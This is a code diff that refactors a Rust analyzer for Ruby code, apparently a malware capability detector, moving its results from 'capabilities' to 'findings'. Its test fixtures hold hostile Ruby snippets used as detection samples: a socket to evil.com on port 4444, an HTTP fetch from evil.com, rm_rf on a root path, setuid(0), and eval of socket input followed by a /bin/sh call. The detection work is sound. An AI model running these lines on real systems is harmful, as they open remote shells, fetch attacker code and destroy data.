@@ -73,27 +73,21 @@ impl RubyAnalyzer {
         // Extract functions
         self.extract_functions(&root, content.as_bytes(), &mut report);
 
-        // Evaluate trait definitions and composite rules for proper criticality
-        let (traits, trait_capabilities) = self
+        // Evaluate trait definitions and composite rules
+        let trait_findings = self
             .capability_mapper
             .evaluate_traits(&report, content.as_bytes());
-        let composite_capabilities = self
+        let composite_findings = self
             .capability_mapper
             .evaluate_composite_rules(&report, content.as_bytes());
 
-        // Add detected traits to report
-        report.traits.extend(traits);
-
-        // Add all trait-based and composite capabilities
-        // These have proper criticality from YAML definitions
-        // The output layer will handle deduplication and showing the most critical version
-        for cap in trait_capabilities
+        // Add all findings
+        for f in trait_findings
             .into_iter()
-            .chain(composite_capabilities.into_iter())
+            .chain(composite_findings.into_iter())
         {
-            // Only add if not already present with same ID
-            if !report.capabilities.iter().any(|c| c.id == cap.id) {
-                report.capabilities.push(cap);
+            if !report.findings.iter().any(|existing| existing.id == f.id) {
+                report.findings.push(f);
             }
         }
 
@@ -532,7 +526,9 @@ impl RubyAnalyzer {
 
             // Add capabilities
             for (cap_id, desc, method, conf, criticality) in capabilities {
-                report.capabilities.push(Capability {
+                report.findings.push(Finding {
+                    kind: FindingKind::Capability,
+                    trait_refs: vec![],
                     id: cap_id.to_string(),
                     description: desc.to_string(),
                     confidence: conf,
@@ -549,9 +545,6 @@ impl RubyAnalyzer {
                             node.start_position().column
                         )),
                     }],
-                    traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
                 });
             }
         }
@@ -565,7 +558,9 @@ impl RubyAnalyzer {
     ) {
         // Ruby command nodes (backticks, %x, etc.)
         if let Ok(_text) = node.utf8_text(source) {
-            report.capabilities.push(Capability {
+            report.findings.push(Finding {
+                kind: FindingKind::Capability,
+                trait_refs: vec![],
                 id: "exec/command/shell".to_string(),
                 description: "Shell command execution".to_string(),
                 confidence: 0.95,
@@ -585,9 +580,6 @@ impl RubyAnalyzer {
                         node.start_position().column
                     )),
                 }],
-                traits: Vec::new(),
-                referenced_paths: None,
-                referenced_directories: None,
             });
         }
     }
@@ -711,7 +703,9 @@ impl RubyAnalyzer {
             }
 
             for (cap_id, desc, method, conf, criticality) in capabilities {
-                report.capabilities.push(Capability {
+                report.findings.push(Finding {
+                    kind: FindingKind::Capability,
+                    trait_refs: vec![],
                     id: cap_id.to_string(),
                     description: desc.to_string(),
                     confidence: conf,
@@ -728,9 +722,6 @@ impl RubyAnalyzer {
                             node.start_position().column
                         )),
                     }],
-                    traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
                 });
             }
         }
@@ -871,10 +862,7 @@ puts "Hello, World!"
 system("whoami")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
@@ -883,10 +871,7 @@ system("whoami")
 exec("/bin/sh")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
@@ -895,10 +880,7 @@ exec("/bin/sh")
 spawn("ls -la")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
@@ -907,10 +889,7 @@ spawn("ls -la")
 IO.popen("ps aux")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
@@ -919,7 +898,7 @@ IO.popen("ps aux")
 eval("puts 'evil'")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "exec/eval"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
     }
 
     #[test]
@@ -928,7 +907,7 @@ eval("puts 'evil'")
 obj.instance_eval { puts "code" }
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "exec/eval"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
     }
 
     #[test]
@@ -940,7 +919,7 @@ MyClass.class_eval do
 end
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "exec/eval"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
     }
 
     #[test]
@@ -950,7 +929,7 @@ obj = Marshal.load(data)
 "#;
         let report = analyze_ruby_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/deserialization"));
     }
@@ -963,7 +942,7 @@ obj = YAML.load(untrusted_data)
 "#;
         let report = analyze_ruby_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/deserialization"));
     }
@@ -974,10 +953,7 @@ obj = YAML.load(untrusted_data)
 socket = TCPSocket.new("evil.com", 4444)
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/socket/create"));
+        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
     }
 
     #[test]
@@ -986,10 +962,7 @@ socket = TCPSocket.new("evil.com", 4444)
 server = TCPServer.new(8080)
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/socket/server"));
+        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
     }
 
     #[test]
@@ -999,10 +972,7 @@ require 'net/http'
 Net::HTTP.get(URI("http://evil.com"))
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/http/client"));
+        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
     }
 
     #[test]
@@ -1012,7 +982,7 @@ require 'fileutils'
 FileUtils.rm_rf("/important")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
     }
 
     #[test]
@@ -1021,7 +991,7 @@ FileUtils.rm_rf("/important")
 File.delete("sensitive.txt")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+        assert!(report.findings.iter().any(|c| c.id == "fs/delete"));
     }
 
     #[test]
@@ -1031,7 +1001,7 @@ obj.send(:private_method, args)
 "#;
         let report = analyze_ruby_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/reflection"));
     }
@@ -1043,7 +1013,7 @@ klass = Object.const_get("Evil")
 "#;
         let report = analyze_ruby_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/reflection"));
     }
@@ -1054,10 +1024,7 @@ klass = Object.const_get("Evil")
 Process.setuid(0)
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "privilege/setuid"));
+        assert!(report.findings.iter().any(|c| c.id == "privilege/setuid"));
     }
 
     #[test]
@@ -1068,7 +1035,7 @@ Process.kill("TERM", pid)
         let report = analyze_ruby_code(code);
         // Test passes if analysis completes
         // Capability detection depends on mapper being loaded
-        let _ = &report.capabilities;
+        let _ = &report.traits;
     }
 
     #[test]
@@ -1097,15 +1064,9 @@ eval(socket.read)
 system("/bin/sh")
 "#;
         let report = analyze_ruby_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/socket/create"));
-        assert!(report.capabilities.iter().any(|c| c.id == "exec/eval"));
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
-        assert!(report.capabilities.len() >= 3);
+        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/eval"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.len() >= 3);
     }
 }
